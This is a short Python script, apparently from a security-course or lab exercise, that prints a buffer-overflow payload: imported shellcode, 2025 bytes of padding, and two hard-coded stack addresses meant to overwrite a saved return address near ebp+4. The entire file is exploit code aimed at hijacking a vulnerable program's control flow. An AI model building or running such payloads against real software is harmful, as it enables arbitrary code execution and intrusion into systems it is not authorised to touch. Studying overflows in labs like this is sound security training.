from shellcode import shellcode
from struct import pack

# desired return address + address of return address location (ebp + 4)
print(shellcode + "\xaa"*2025 + pack("<I", 0xbffe9ec8) + pack("<I", 0xbffea6dc))
